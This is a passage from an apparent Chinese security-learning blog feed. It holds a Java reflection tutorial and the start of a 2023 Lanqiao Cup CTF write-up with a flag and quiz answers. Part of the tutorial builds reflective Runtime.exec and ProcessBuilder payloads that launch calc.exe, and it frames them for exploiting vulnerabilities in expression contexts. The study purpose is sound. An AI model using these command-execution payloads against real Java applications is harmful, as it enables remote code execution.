class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reflectPrivateConstructor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获得Class对象</span></span><br><span class="line">            Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;reflect.Student&quot;</span>);</span><br><span class="line">            <span class="comment">//调用getDeclaredField(String name)方法</span></span><br><span class="line">            Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">            <span class="comment">//调用setAccessible(boolean)后可修改访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//通过Constructor对象创建Student对象</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) constructor.newInstance(<span class="number">100</span>);</span><br><span class="line">            <span class="comment">//输出创建好的Student对象</span></span><br><span class="line">            System.out.println(student);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        reflectPrivateConstructor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h3><p>Field</p><p>跟获取构造方法一样 getFields()等</p><p>也是要获取字节码文件</p><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>getField(String name)</td><td>获得该类中某个公有的字段</td></tr><tr><td>getFields()</td><td>获得该类中所有公有的字段</td></tr><tr><td>getDeclaredField(String name)</td><td>获得该类中某个字段</td></tr><tr><td>getDeclaredFields()</td><td>获得该类中所有字段</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reflectPrivateField</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获得Class对象</span></span><br><span class="line">            Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;reflect.Student&quot;</span>);</span><br><span class="line">            <span class="comment">//getDeclaredField(String name)方法</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="comment">//调用setAccessible(boolean)后可修改访问权限</span></span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//通过Class类反射一个Student对象</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) c1.newInstance();</span><br><span class="line">            <span class="comment">//修改指定Student对象的静态成员变量:id = 500</span></span><br><span class="line">            field.set(student,<span class="number">500</span>);</span><br><span class="line">            <span class="comment">//输出Student对象</span></span><br><span class="line">            System.out.println(student);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        reflectPrivateField();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取并调用成员方法"><a href="#获取并调用成员方法" class="headerlink" title="获取并调用成员方法"></a>获取并调用成员方法</h3><p>都差不多：</p><p>getMethod(String name,Class…<?>parameterTypes)获得该类中某个公有的方法getMethods()获得该类中所有公有的方法getDeclaredMethod(String name,Class...<?>parameterTypes)获得该类中某个方法<br>getDeclaredMethods()获得该类中所有方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reflectPrivateMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获得Class对象</span></span><br><span class="line">            Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;reflect.Student&quot;</span>);</span><br><span class="line">            <span class="comment">//调用getDeclaredMethod(String name,Class...&lt;?&gt;parameterTypes)方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;func2&quot;</span>,String.class);</span><br><span class="line">            <span class="comment">//获取私有的属性或方法一般都要调用setAccessible(boolean)方法</span></span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//通过Class类反射一个Student对象</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) c1.newInstance();</span><br><span class="line">            <span class="comment">//Method对象调用invoke方法</span></span><br><span class="line">            <span class="comment">//让指定的Student对象调用指定的私有方法并传参</span></span><br><span class="line">            method.invoke(student,<span class="string">&quot;通过反射机制调用Student类的私有方法&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        reflectPrivateMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取与前面类似</p><p>调用的时候需要用到一个新函数：<strong>invoke</strong></p><p>invoke 的作用是执行方法，它的第一个参数是：</p><ul><li><p>如果这个方法是一个普通方法，那么第一个参数是类对象</p></li><li><p>如果这个方法是一个静态方法，那么第一个参数是类</p></li></ul><p>实例化类对象的⽅法： newInstance</p><p>class.newInstance() 的作用就是调用这个类的无参构造函数</p><p>当发现使用 newInstance 总是不成功，这时候原因可能是：</p><ol><li><p>你使用的类没有无参构造函数</p></li><li><p>你使用的类构造函数是私有的</p></li></ol><p>所以如果我们这样执行命令是不行的：（这本来是一个有公共的无参构造的执行方法）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>会报错：</p><p><img src="https://bu.dusays.com/2024/05/15/6644a18c23ecd.png" alt="image-20240515183638264"></p><p>原因是 Runtime 类的构造方法是私有的</p><p>单例模式：类的构造方法是私有的</p><p>对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来</p><p>获取：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="comment">// 建立连接的代码...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建</p><p>立多个数据库连接。</p><p><strong>而Runtime类就是单例模式</strong></p><p>我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象</p><p>所以我们将上述命令改为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>也就是：   单例模式下的执行方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>也可以直接使用：getDeclaredConstructor()  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>); <span class="comment">//这个是必须的。我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</p><p>其实就是我们调用成员方法开始给到代码</p><p>也就是调用 getConstructor </p><p>因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。</p><p>获取到构造函数后，我们使用 newInstance 来执行。</p><p>将上述代码整合成一个payload </p><p>比如:ProcessBuilder–一个常见的命令执行方式，我们使用反射来获取其构造函数，然后调用start() 来执行命令：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure><p><code>(ProcessBuilder)</code> 强制类型转换用于将 <code>Object</code> 类型（实际上是 <code>Class.newInstance()</code> 返回的实例）转换为 <code>ProcessBuilder</code> 类型，以便我们可以调用 <code>ProcessBuilder</code> 类的 <code>start()</code> 方法来启动一个进程。</p><blockquote><p>ProcessBuilder有两个构造函数：</p><ul><li><p>public ProcessBuilder(List<String> command)</p></li><li><p>public ProcessBuilder(String… command)</p></li></ul></blockquote><p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 <code>List.class</code> 。</p><p>但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表</p><p>达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步</p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是ProcessBuilder Object了。</p><p>那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反射执行呢？</p><p><strong>可变长参数</strong>：就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。</p><p>对于可变长参数，Java其实在编译的时候会编译成一个数组</p><p>也就是说 这两个事等价的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>所以对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了</p><p>我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><p>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(newString[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><h3 id="反射的其他使用"><a href="#反射的其他使用" class="headerlink" title="反射的其他使用"></a>反射的其他使用</h3><h4 id="反射main方法"><a href="#反射main方法" class="headerlink" title="反射main方法"></a>反射main方法</h4><p>其实也没什么好说的 直接上代码：</p><p>student类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;main方法执行了。。。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射main方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Student类的main方法、不要与当前的main方法搞混了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//1、获取Student对象的字节码</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;fanshe.main.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、获取main方法</span></span><br><span class="line"> <span class="type">Method</span> <span class="variable">methodMain</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;main&quot;</span>, String[].class);<span class="comment">//第一个参数：方法名称，第二个参数：方法形参的类型，</span></span><br><span class="line"><span class="comment">//3、调用main方法</span></span><br><span class="line"><span class="comment">// methodMain.invoke(null, new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;);</span></span><br><span class="line"> <span class="comment">//第一个参数，对象类型，因为方法是static静态的，所以为null可以，第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</span></span><br><span class="line"> <span class="comment">//这里拆的时候将  new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125; 拆成3个对象。。。所以需要将它强转。</span></span><br><span class="line"> methodMain.invoke(<span class="literal">null</span>, (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;);<span class="comment">//方式一</span></span><br><span class="line"><span class="comment">// methodMain.invoke(null, new Object[]&#123;new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;&#125;);//方式二</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果事执行了main方法</p><h4 id="通过反射运行配置文件内容"><a href="#通过反射运行配置文件内容" class="headerlink" title="通过反射运行配置文件内容"></a>通过反射运行配置文件内容</h4><p>student类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;is show()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件(这里事txt文件)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">className = cn.fanshe.<span class="type">Student</span></span><br><span class="line"><span class="variable">methodName</span> <span class="operator">=</span> show</span><br></pre></td></tr></table></figure><p>反射运行配置文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们利用反射和配置文件，可以使：应用程序更新时，对源码无需进行任何修改</span></span><br><span class="line"><span class="comment"> * 我们只需要将新类发送给客户端，并修改配置文件即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//通过反射获取Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stuClass</span> <span class="operator">=</span> Class.forName(getValue(<span class="string">&quot;className&quot;</span>));<span class="comment">//&quot;cn.fanshe.Student&quot;</span></span><br><span class="line"><span class="comment">//2获取show()方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> stuClass.getMethod(getValue(<span class="string">&quot;methodName&quot;</span>));<span class="comment">//show</span></span><br><span class="line"><span class="comment">//3.调用show()方法</span></span><br><span class="line">m.invoke(stuClass.getConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此方法接收一个key，在配置文件中获取相应的value</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getValue</span><span class="params">(String key)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line"><span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();<span class="comment">//获取配置文件的对象</span></span><br><span class="line"><span class="type">FileReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;pro.txt&quot;</span>);<span class="comment">//获取输入流</span></span><br><span class="line">pro.load(in);<span class="comment">//将流加载到配置文件对象中</span></span><br><span class="line">in.close();</span><br><span class="line"><span class="keyword">return</span> pro.getProperty(key);<span class="comment">//返回根据key获取的value值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时控制台会输出：</p><p>is show()</p><p>当我们升级这个系统时，不要Student类，而需要新写一个Student2的类时，这时只需要更改pro.txt的文件内容就可以了。代码就一点不用改动</p><p>student2:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student2</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;is show2()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该配置文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">className = cn.fanshe.<span class="type">Student2</span></span><br><span class="line"><span class="variable">methodName</span> <span class="operator">=</span> show2</span><br></pre></td></tr></table></figure><p>此时控制台会输出：</p><p>is show2();</p><h4 id="通过反射越过泛型检查"><a href="#通过反射越过泛型检查" class="headerlink" title="通过反射越过泛型检查"></a>通过反射越过泛型检查</h4><p>泛型用在编译期，编译过后泛型擦除（消失掉）。所以是可以通过反射越过泛型检查的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 通过反射越过泛型检查</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 例如：有一个String泛型的集合，怎样能向这个集合中添加一个Integer类型的值？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">ArrayList&lt;String&gt; strList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">strList.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">strList.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//strList.add(100);</span></span><br><span class="line"><span class="comment">//获取ArrayList的Class对象，反向的调用add()方法，添加数据</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">listClass</span> <span class="operator">=</span> strList.getClass(); <span class="comment">//得到 strList 对象的字节码 对象</span></span><br><span class="line"><span class="comment">//获取add()方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> listClass.getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line"><span class="comment">//调用add()方法</span></span><br><span class="line">m.invoke(strList, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历集合</span></span><br><span class="line"><span class="keyword">for</span>(Object obj : strList)&#123;</span><br><span class="line">System.out.println(obj);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制台输出：</p><p>aaa<br>bbb<br>100</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-蓝桥杯-wp</title>
      <link href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/"/>
      <url>/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝桥杯"><a href="#蓝桥杯" class="headerlink" title="蓝桥杯"></a>蓝桥杯</h1><p>最后成绩是省二啊 </p><h2 id="情报收集-web"><a href="#情报收集-web" class="headerlink" title="情报收集(web)"></a>情报收集(web)</h2><h3 id="爬虫协议"><a href="#爬虫协议" class="headerlink" title="爬虫协议"></a>爬虫协议</h3><p><img src="https://bu.dusays.com/2024/05/15/664420864b79b.png" alt="image-20240427102727733"></p><p>访问&#x2F;robots.txt</p><p><img src="https://bu.dusays.com/2024/05/15/664420866bf64.png" alt="image-20240427102809280"></p><p>最后一个可访问</p><p><img src="https://bu.dusays.com/2024/05/15/664420858fdd1.png" alt="image-20240427102841917"></p><p>flag在第二个里面(91……)</p><p><img src="https://bu.dusays.com/2024/05/15/66442086affad.png" alt="image-20240427103008944"></p><p>flag{79f508c3-12fa-4514-aa2d-69165aa3bfed}</p><h2 id="安全知识-理论"><a href="#安全知识-理论" class="headerlink" title="安全知识(理论)"></a>安全知识(理论)</h2><h3 id="单选1"><a href="#单选1" class="headerlink" title="单选1"></a>单选1</h3><p><img src="https://bu.dusays.com/2024/05/15/6644208697866.png" alt="image-20240427103219978"></p><p>C</p><h3 id="单选2"><a href="#单选2" class="headerlink" title="单选2"></a>单选2</h3><p><img src="https://bu.dusays.com/2024/05/15/66442086abb7b.png" alt="image-20240427103302357"></p><p>C</p><h3 id="单选3"><a href="#单选3" class="headerlink" title="单选3"></a>单选3</h3><p><img src="https://bu.dusays.com/2024/05/15/66442086b6db2.png" alt="image-20240427103326315"></p><p>这道我做错了 选的A</p><p>应该是A（好像是按错了）</p><h3 id="单选4"><a href="#单选4" class="headerlink" title="单选4"></a>单选4</h3><p><img src="https://bu.dusays.com/2024/05/15/6644208671578.png" alt="image-20240427103434930"></p><p>A</p><h3 id="单选5"><a href="#单选5" class="headerlink" title="单选5"></a>单选5</h3><p><img src="https://bu.dusays.com/2024/05/15/6644208580fc5.png" alt="image-20240427103512863"></p><p>好像是B</p><h3 id="单选6"><a href="#单选6" class="headerlink" title="单选6"></a>单选6</h3><p><img src="https://bu.dusays.com/2024/05/15/66442085b2f92.png" alt="image-20240427103630512"></p><p>B</p><h3 id="单选7"><a href="#单选7" class="headerlink" title="单选7"></a>单选7</h3><p><img src="https://bu.dusays.com/2024/05/15/664420861f054.png" alt="image-20240427103649524"></p><p>C</p><h3 id="单选8"><a href="#单选8" class="headerlink" title="单选8"></a>单选8</h3><p><img src="https://bu.dusays.com/2024/05/15/6644208582b75.png" alt="image-20240427103706466"></p><p>C</p><h3 id="单选9"><a href="#单选9" class="headerlink" title="单选9"></a>单选9</h3><p><img src="https://bu.dusays.com/2024/05/15/66442085915be.png" alt="image-20240427103724848"></p><p>B</p><h3 id="单选10"><a href="#单选10" class="headerlink" title="单选10"></a>单选10</h3><p><img src="https://bu.dusays.com/2024/05/15/664420859dd02.png" alt="image-20240427103750962"></p><p>B</p><h2 id="数据分析-misc"><a href="#数据分析-misc" class="headerlink" title="数据分析(misc)"></a>数据分析(misc)</h2><h3 id="packet"><a href="#packet" class="headerlink" 